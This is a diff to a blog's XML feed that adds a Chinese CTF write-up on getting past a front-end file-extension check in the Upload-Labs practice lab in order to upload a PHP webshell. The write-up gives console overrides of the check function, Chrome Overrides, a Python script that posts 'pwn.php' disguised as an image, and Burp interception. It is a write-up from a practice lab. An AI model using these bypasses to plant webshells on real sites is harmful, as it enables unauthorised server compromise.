@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>关于上传文件题目绕过前端限制的方法</title>
+    <link href="/2023/10/10/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E9%A2%98%E7%9B%AE%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95/"/>
+    <url>/2023/10/10/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E9%A2%98%E7%9B%AE%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6%E7%9A%84%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习，重温一下CTF知识和手感，回顾一下前端绕过手法。</p><a id="more"></a><hr><h3 id="关于题目环境"><a href="#关于题目环境" class="headerlink" title="关于题目环境"></a>关于题目环境</h3><p>来自BUUCTF网站的Upload-Labs-Linux题目，其实就是Upload-Labs。</p><p>要求上传一个PHP WebShell，主要限制来自于一段JavaScript代码：</p><pre><code class="JavaScript">function checkFile() {    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file == null || file == &quot;&quot;) {        alert(&quot;请选择要上传的文件!&quot;);        return false;    }    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name) == -1) {        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    }}</code></pre><h3 id="直接修改网页源代码"><a href="#直接修改网页源代码" class="headerlink" title="直接修改网页源代码"></a>直接修改网页源代码</h3><p>由于前端限制由JavaScript代码完成，而且浏览器由我们直接控制，前端代码存在被我们修改的可能性，所以修改网页源代码后直接通过网页上传文件的方式最为快捷。</p><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p>最简单的方法是直接在Chrome浏览器的Console上操作，将checkFile替换为一个新的永远返回True的匿名函数：</p><pre><code class="JavaScript">checkFile = function(){    return true;}</code></pre><p>此外，也可以用修改onsubmit事件的方式来完成：</p><pre><code class="JavaScript">document.getElementsByName(&quot;submit&quot;)[0].parentNode.parentNode.onsubmit = function(){    return true;}</code></pre><h4 id="Overrides"><a href="#Overrides" class="headerlink" title="Overrides"></a>Overrides</h4><p>此外，Chrome也提供了Overrides机制，可以用本地文件覆盖前端文件实现前端源代码的替换，选定本地的源代码文件夹后，修改允许上传的文件后缀并保存，chrome就会在本地保存修改后的源代码文件。</p><p>刷新后就可以直接上传PHP文件。</p><h3 id="Python脚本上传文件"><a href="#Python脚本上传文件" class="headerlink" title="Python脚本上传文件"></a>Python脚本上传文件</h3><p>通过requests库进行文件上传：</p><pre><code class="python"># -*- coding:utf8 -*-import requestsurl = &quot;http://9cffd483-577f-4ea4-983b-4512fc1e0f53.node4.buuoj.cn:81/Pass-01/index.php&quot;f = open(&quot;pwn.php&quot;, &quot;rb&quot;)files = {    &quot;upload_file&quot;: (&quot;pwn.php&quot;, f, &quot;image/jpeg&quot;),    &quot;submit&quot;: (None, &quot;abc&quot;)}response = requests.post(url, files=files)print response.status_codeprint response.request.bodyprint response.request.headers</code></pre><p>试了n种方法都传不上去，最后发现加上submit参数就行了，Orz。</p><h3 id="BurpSuite代理Chrome"><a href="#BurpSuite代理Chrome" class="headerlink" title="BurpSuite代理Chrome"></a>BurpSuite代理Chrome</h3><p>最后也是最常用的办法就是通过Burp抓包重发了，配置系统代理然后抓包修改就好。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/wang0907/article/details/127547365" target="_blank" rel="noopener">如何使用Chrome直接编辑前端代码</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>CTF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2023-37582 Apache RocketMQ 文件写入漏洞</title>
     <link href="/2023/08/30/CVE-2023-37582-Apache-RocketMQ-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/30/CVE-2023-37582-Apache-RocketMQ-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
@@ -3349,9 +3370,9 @@
       
       <tag>CTF</tag>
       
-      <tag>复现</tag>
-      
       <tag>NodeJS</tag>
+      
+      <tag>复现</tag>
       
       <tag>前端</tag>
       
